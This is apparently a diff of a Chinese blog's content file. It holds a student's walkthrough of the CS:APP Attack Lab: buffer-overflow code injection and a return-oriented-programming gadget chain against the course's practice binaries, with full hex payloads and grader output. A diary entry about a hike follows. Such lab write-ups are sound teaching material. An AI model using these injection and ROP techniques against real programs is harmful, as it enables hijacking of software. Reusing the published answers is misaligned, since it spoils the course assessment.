$0x403110,%esi</span><br><span class="line">    0x0000000000401829 &lt;+61&gt;:	mov    $0x1,%edi</span><br><span class="line">    0x000000000040182e &lt;+66&gt;:	mov    $0x0,%eax</span><br><span class="line">    0x0000000000401833 &lt;+71&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x0000000000401838 &lt;+76&gt;:	mov    $0x2,%edi</span><br><span class="line">    0x000000000040183d &lt;+81&gt;:	callq  0x401d4f &lt;fail&gt;</span><br><span class="line">    0x0000000000401842 &lt;+86&gt;:	mov    $0x0,%edi</span><br><span class="line">    0x0000000000401847 &lt;+91&gt;:	callq  0x400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>这里注意一下 +4 行. <code>%edi</code> 还记得吗? 是默认的传入函数的第一个参数. 也就是说, 我们要在调用touch2之前, 将 <code>%edi</code>寄存器的值设置为我们的cookie. 如果只是类似上一题中的代码跳转的话, 我们没有办法对寄存器进行实际的修改, 所以我们需要将自己的代码注入进去后能够实际运行它们.</p>
+<h4 id="注入代码的执行"><a href="#注入代码的执行" class="headerlink" title="注入代码的执行"></a>注入代码的执行</h4><p>具体的操作为: getbuf 结束后, 返回地址指向栈中. (准确的说是我们注入的字符数组) 使得我们注入的字符被解析成汇编代码并被运行. 在这段注入的代码末尾再跳转进touch2函数.</p>
+<p>也就是说, 我们注入的字符需要实际上实现下面这段汇编代码的功能.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;注入代码需要实现的功能</span><br><span class="line">&#x2F;&#x2F;这些保存在 touch2_tmp.s 中</span><br><span class="line">mov $0x59b997fa,%rdi		&#x2F;&#x2F;将cookie写入%edi寄存器</span><br><span class="line">pushq $0x4017ec				&#x2F;&#x2F;将touch2首地址推入栈顶</span><br><span class="line">retq						&#x2F;&#x2F;retq在执行时,将跳转touch2函数</span><br></pre></td></tr></table></figure>
+<p>通过使用Byte Codes生成器(参看对应的讲解), 我们可以拿到这些ByteCode:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -c touch2_tmp.s 			&#x2F;&#x2F;使用汇编器生成二进制的可重定位目标程序touch2_tmp.o</span><br><span class="line">objdump -d touch2_tmp.o &gt;touch2_tmp.d	&#x2F;&#x2F;使用objdump将目标文件得到中间文件</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;下面是中间文件touch2_tmp.d中的内容,有精间</span><br><span class="line">0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">c:   c3                      retq</span><br></pre></td></tr></table></figure>
+<h4 id="最后的小处理"><a href="#最后的小处理" class="headerlink" title="最后的小处理"></a>最后的小处理</h4><p>我们还需要对最终的in2文件进行小小的处理</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;这是 in2.txt 文件中的内容</span><br><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">68 ec 17 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 </span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>上述代码的前3行就是我们拿到的 touch2_tmp.d 中的ByteCode</p>
+<p>4-7行是为了填充缓冲区, 事实上1-7行一共有 0x28   个字符  <span style="background-color: #252525">不信你数数</span></p>
+<p>第8行是将getbuf函数的返回地址覆盖为第1行的地址 0x5561dc78, 这个地址是很容易拿到的.</p>
+<p><strong>大功告成</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw &lt;in2.txt&gt; out2</span><br><span class="line">.&#x2F;ctarget -i out2 -q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>第二关就过啦~~</p>
+<hr>
+<h3 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h3><p>第三题的背景依旧是test函数. 表面逻辑: 在getbuf 函数结束后跳转至 touch3 函数. 并且在touch3函数中需要调用hexmatch函数, 后者是这么一个函数: 传入一个地址, 并读取该地址存储的字符串, 这个字符串应该是与cookie相同. (不包括前缀0x).</p>
+<p>整体的思路类似Level2, getbuf 函数结束后跳转至缓冲区中注入的代码. 在注入代码中将参数1设置为字符串的地址, 并且注入代码段结束后跳转至touch3函数. </p>
+<p>在retq语句跳转至其他函数我们已经的轻车熟路了, 这里直接给出touch3的首地址: <code>0x4018fa</code>, 我们需要在注入代码中实现该地址的入栈, 这样注入代码的返回会读取栈顶, 从而跳转至touch3.</p>
+<p>基本分析完毕, 现在需要考虑的只剩:</p>
+<ol>
+<li>注入什么字符串?</li>
+<li>将字符串注入在哪?</li>
+</ol>
+<h4 id="字符串注入内容"><a href="#字符串注入内容" class="headerlink" title="字符串注入内容"></a>字符串注入内容</h4><p>我们需要将cookie转化为字符串, 这里需要注意两点: </p>
+<ol>
+<li>每个字符占一个字节. 使用ASCII码表示</li>
+<li>字符串的结尾需要使用<code>\0</code>结尾</li>
+</ol>
+<p>在Linux平台下, 执行<code>man ascii</code>命令可以获取ASCII码表, 对应的编码很容易对照获得</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;cookie 的ASCII表述</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+<h4 id="字符串注入位置"><a href="#字符串注入位置" class="headerlink" title="字符串注入位置"></a>字符串注入位置</h4><p>这里比较坑. </p>
+<p>我们看一下 hexmatch 函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//hexmatch C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">   <span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>()%<span class="number">100</span>;</span><br><span class="line">   <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">   <span class="keyword">return</span> strncmo(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当我们在对缓冲区写入的时候, 实际上的可以写入的地方包括: test函数的栈帧, getbuf函数的栈帧, 以及其他地方. 但是当我们从getbuf函数返回的时候, 原本的getbuf栈帧被回收(虽然里面的数据没有清掉) , 并且在之后分配在了hexmatch 的栈帧上. </p>
+<p>那么栈的分配与回收仅仅是栈指针的变动, 可不可以将数据依旧储存在栈帧里面呢? 很遗憾也是不行的. 在hexmatch函数中划分了一个长度为110 的char数组, 并且将s字符串的地址设置为其中的的任意处, 这就使得你原本储存的数据<strong>有可能</strong>被覆盖掉.</p>
+<p>于是, 我们选择将数据写入test函数的栈帧中.</p>
+<p><strong>存疑</strong>: 可不可以将数据写入栈的其他位置? 比如栈 120 处.</p>
+<h4 id="字节代码的编写"><a href="#字节代码的编写" class="headerlink" title="字节代码的编写"></a>字节代码的编写</h4><p>根据以上分析, 我们已经能够写出需要注入的部分</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov   $0x5561dca8,%rdi      &#x2F;&#x2F;将字符串地址推入rdi 此条地址(执行代码的首地址)为0x5561dc78</span><br><span class="line">pushq $0x4018fa             &#x2F;&#x2F;touch3地址</span><br><span class="line">retq</span><br><span class="line">...补全缓冲区 28</span><br><span class="line">...缓冲区内的执行代码的首地址 (8位地址)0x5561dc78</span><br><span class="line">...储存cookie, 写入语句 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+<p>上述1-3行, 是将会执行的代码, 包括将字符串地址设为参数1, 将touch3地址入栈, 以及返回touch3</p>
+<p>第4行是填满缓冲区的, 1-4行总计28字节</p>
+<p>缓冲区后属于test的栈帧, 最底处保存的是getbuf的retq返回地址, 指向执行代码的首地址.</p>
+<p>test更往后的地方就是我们储存cookie的地方. 此处的地址即为字符串地址0x0x5561dca8</p>
+<h4 id="最终答案"><a href="#最终答案" class="headerlink" title="最终答案"></a>最终答案</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55</span><br><span class="line">68 fa 18 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+<p>1-3: 执行代码</p>
+<p>4-7: 填充</p>
+<p>8: 执行代码的首地址</p>
+<p>9: 字符串地址的首地址</p>
+<p><strong>大功告成</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw &lt;in3.txt&gt; out3</span><br><span class="line">.&#x2F;ctarget -i out3 -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="题解-RTARGET"><a href="#题解-RTARGET" class="headerlink" title="题解: RTARGET"></a>题解: RTARGET</h2><p>我们在上一部分利用了缓冲区溢出, 从而劫持返回地址, 将地址返回至我们期望的地址. 除此之外我们还将代码注入进缓冲区, 并通过返回地址执行这段代码. 我们还注意到了在程序的运行的过程中可能存在的内存覆盖, 因此我们规避并选取适当的地方来储存数据.</p>
+<p>上述手段被称为 <strong>代码注入攻击</strong> (code injection attack) 已经是”莫里斯蠕虫”时代的手法了, 现代编译器使用 <strong>地址空间布局随机化</strong>(Address space layout randomization, ASLR), 栈空间代码禁止执行(增加 “可执行” 的权限位) , 与<strong>金丝雀</strong>(Canary) 等多种手段防范代码注入攻击. 对于前两种防御手段, 黑客们使用了名为 <strong>面向返回编程</strong> (Return-oriented programming, ROP) 的技巧, 仅仅使用原有代码的部分碎片拼接成待执行的代码. </p>
+<p>本题将学习ROP来进行代码攻击. 在此之前, 有必要讲解 <em>gadgetfarm</em></p>
+<h3 id="Gadget-Farm-的使用"><a href="#Gadget-Farm-的使用" class="headerlink" title="Gadget Farm 的使用"></a>Gadget Farm 的使用</h3><p>在rtagret中包括了一系列函数,  里面包括的一系列字节码将被我们作为碎片(gadget) 进行拼接并使用. 这些函数被称为farm函数</p>
+<p>我们可以拿到 farm 中的小gadgets:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump rtarget &gt; farm-dump.txt</span><br></pre></td></tr></table></figure>
+<p> 得到的文件中只有一部分是我们需要的, 删去不必要的代码后, 最终拿到:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rtarget:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .init:</span><br><span class="line"></span><br><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401999:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax</span><br><span class="line">  40199f:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019b5 &lt;setval_424&gt;:</span><br><span class="line">  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)</span><br><span class="line">  4019bb:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019bc &lt;setval_470&gt;:</span><br><span class="line">  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4019c2:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019d0 &lt;mid_farm&gt;:</span><br><span class="line">  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4019d5:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019e1 &lt;setval_296&gt;:</span><br><span class="line">  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)</span><br><span class="line">  4019e7:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019e8 &lt;addval_113&gt;:</span><br><span class="line">  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax</span><br><span class="line">  4019ee:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019ef &lt;addval_490&gt;:</span><br><span class="line">  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax</span><br><span class="line">  4019f5:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019f6 &lt;getval_226&gt;:</span><br><span class="line">  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax</span><br><span class="line">  4019fb:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019fc &lt;setval_384&gt;:</span><br><span class="line">  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)</span><br><span class="line">  401a02:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a0a &lt;setval_276&gt;:</span><br><span class="line">  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)</span><br><span class="line">  401a10:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a18 &lt;getval_345&gt;:</span><br><span class="line">  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax</span><br><span class="line">  401a1d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a1e &lt;addval_479&gt;:</span><br><span class="line">  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax</span><br><span class="line">  401a24:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a25 &lt;addval_187&gt;:</span><br><span class="line">  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax</span><br><span class="line">  401a2b:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a2c &lt;setval_248&gt;:</span><br><span class="line">  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)</span><br><span class="line">  401a32:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax</span><br><span class="line">  401a38:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a39 &lt;addval_110&gt;:</span><br><span class="line">  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax</span><br><span class="line">  401a3f:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a40 &lt;addval_487&gt;:</span><br><span class="line">  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax</span><br><span class="line">  401a46:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a47 &lt;addval_201&gt;:</span><br><span class="line">  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax</span><br><span class="line">  401a4d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a4e &lt;getval_272&gt;:</span><br><span class="line">  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax</span><br><span class="line">  401a53:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a54 &lt;getval_155&gt;:</span><br><span class="line">  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax</span><br><span class="line">  401a59:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a5a &lt;setval_299&gt;:</span><br><span class="line">  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)</span><br><span class="line">  401a60:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a61 &lt;addval_404&gt;:</span><br><span class="line">  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax</span><br><span class="line">  401a67:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a68 &lt;getval_311&gt;:</span><br><span class="line">  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax</span><br><span class="line">  401a6d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a6e &lt;setval_167&gt;:</span><br><span class="line">  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)</span><br><span class="line">  401a74:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a75 &lt;setval_328&gt;:</span><br><span class="line">  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)</span><br><span class="line">  401a7b:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a7c &lt;setval_450&gt;:</span><br><span class="line">  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)</span><br><span class="line">  401a82:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a83 &lt;addval_358&gt;:</span><br><span class="line">  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax</span><br><span class="line">  401a89:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a8a &lt;addval_124&gt;:</span><br><span class="line">  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax</span><br><span class="line">  401a90:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a91 &lt;getval_169&gt;:</span><br><span class="line">  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax</span><br><span class="line">  401a96:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a97 &lt;setval_181&gt;:</span><br><span class="line">  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)</span><br><span class="line">  401a9d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a9e &lt;addval_184&gt;:</span><br><span class="line">  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax</span><br><span class="line">  401aa4:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401aa5 &lt;getval_472&gt;:</span><br><span class="line">  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax</span><br><span class="line">  401aaa:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ab2 &lt;end_farm&gt;:</span><br><span class="line">  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401ab7:	c3                   	retq   </span><br><span class="line">  401ab8:	90                   	nop</span><br><span class="line">  401ab9:	90                   	nop</span><br><span class="line">  401aba:	90                   	nop</span><br><span class="line">  401abb:	90                   	nop</span><br><span class="line">  401abc:	90                   	nop</span><br><span class="line">  401abd:	90                   	nop</span><br><span class="line">  401abe:	90                   	nop</span><br><span class="line">  401abf:	90                   	nop</span><br></pre></td></tr></table></figure>
+<p>题目还提供了部分汇编指令的对应的字节表示:</p>
+<p><img src="../../Lab-Notes/img/Byte encoding of instructions.png" alt="byte coding"></p>
+<h3 id="RLevel2"><a href="#RLevel2" class="headerlink" title="RLevel2"></a>RLevel2</h3><p>题目本身与Ctarget一致, 区别在于源代码编译的过程中使用了ASLR与禁止栈执行. 笔记中前缀 R 以示区分.</p>
+<p>先来回顾一下我们在Level2中干了什么, 我们将代码注入了缓冲区, 并运行之, 从而使得cookie写入rdi寄存器. </p>
+<p>在本题中, 我们选择先将 cookie 存入栈中, 然后使用 pop 指令将cookie推入$rdi 寄存器.</p>
+<p>然而很遗憾, farm中并没有 <code>pop $rdi</code>对应的指令 5f , 倒是 <code>pop $rax</code> 对应的58指令频繁出现, 我们于是考虑迂回作战, 先将cookie推入rax, 再使用 <code>mov $rax,$rdi</code> 完成目标.</p>
+<p>farm中有很多条路径可以实现上述目标, 我选择的是 <code>&lt;getval_280&gt;</code> 与 <code>&lt;setval_426&gt;</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:	c3                   	retq  </span><br><span class="line">&#x2F;*</span><br><span class="line">起始于0x4019cc</span><br><span class="line">58 : pop $rax </span><br><span class="line">90 : no op</span><br><span class="line">c3 : retq</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:	c3                   	retq   </span><br><span class="line">&#x2F;*</span><br><span class="line">起始于0x4019c5</span><br><span class="line">48 89 c7 : mov $rax,$rdi</span><br><span class="line">90 : no op</span><br><span class="line">c3 : retq</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
+<p>因此图解如下: </p>
+<p><img src="../../Lab-Notes/img/Rtouch2_pic.png" alt="Rtouch2_pic"></p>
+<p>答案为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>大功告成</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;shell 输入</span><br><span class="line">.&#x2F;hex2raw &lt;in4.txt &gt; out4</span><br><span class="line">.&#x2F;rtarget -i out4 -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell 输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>2020年7月3日~7月8日. 完成了CS:APP 第三个配套实验 Attack Lab.</p>
+<p>这个实验包括了大量的需要自学的内容, 涉及到内存中栈的管理, 函数跳转(retq)的方式, 缓冲区溢出错误, gets()等函数的缺陷等知识点. 了解并尝试了 代码注入攻击, 面向返回编程等代码攻击手段. 了解了 空间布局随机化, 栈禁止执行, 金丝雀区的设置 等代码防御方式.</p>
+<p>提高了自学能力以及对 gdb 等调试工具的使用能力.</p>
+<p>由于本实验最后一小题 RLevel3 本身并没有新知识点 但需要花费大量时间解题, 故暂时略去不做.</p>
 ]]></content>
       <categories>
-        <category>技术小记</category>
+        <category>学习笔记</category>
+        <category>乘龙术</category>
+        <category>CSAPP</category>
       </categories>
       <tags>
-        <tag>Hexo</tag>
+        <tag>读书笔记:技术</tag>
+        <tag>CSAPP</tag>
+        <tag>Lab</tag>
       </tags>
   </entry>
   <entry>
-    <title>初窥HTTP--读&lt;图解HTTP&gt;小记</title>
-    <url>/2020/08/01/%E5%88%9D%E7%AA%A5HTTP-%E8%AF%BB-%E5%9B%BE%E8%A7%A3HTTP-%E5%B0%8F%E8%AE%B0/</url>
+    <title>时与光W-202007-2</title>
+    <url>/2020/07/24/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-2/</url>
+    <content><![CDATA[<p>2020年7月6日~2020年7月12日</p>
+<p>徒步: 溧阳-丫髻山</p>
+<a id="more"></a>
+<h2 id="徒步-溧阳-丫髻山"><a href="#徒步-溧阳-丫髻山" class="headerlink" title="徒步: 溧阳-丫髻山"></a>徒步: 溧阳-丫髻山</h2><p>这周日 (7月11-12日) 第一次尝试徒步+爬野山. 以下为流水账记录:</p>
+<p>因为集合的时间是周日大清早, 所以周六就提前去南京了, 找了一家普普通通的青旅安顿下来, 晚上在玄武湖公园逛了一圈 —— 预料之外的大啊哈哈哈, 晚上来这里跑步应该不错, 可惜还是在市中心, 空气不太行. 话说南京的早点包子真难吃啊… 早起去便利店安排了一些物资, 2L 的怡宝+1.5L 的绿茶, 后来证明买这些都是非常必要的.</p>
+<p>领队是个很阳光的大兄弟, 很会唠. 等大巴的时候发现大家都是装备齐全, 背包+登山杖+徒步鞋, 只有我背个小破书包, 蹬了个平底运动鞋来了哈哈哈, 下次一定准备齐全😂. 大巴上领座是位带着两个双胞胎的大叔, 一看就是老户外达人了, 孩子约莫上初中, 一人一个登山杖. 一家人乐乐呵呵地来徒步, 又锻炼体质又促进感情, 真好啊🍋. </p>
+<p>一个钟左右就到溧阳了. 目的地其实是溧阳, 句容交界的两座山头 (最后只爬了一座) . 本来的计划是野道去公路回, 结果前一天一直下雨, 就决定先走公路, 让山路多晒晒太阳. 说起来超级幸运, 本来都已经做好了下雨取消山路的心理准备了, 没想到早上突然晴天. 这也导致我没有带防晒(呜呜呜我以为会是阴天的脑子瓦特了), 带着防身又不多~ 一天走下来直接黑了两个度, 辛苦养半年,一朝回到解放前. </p>
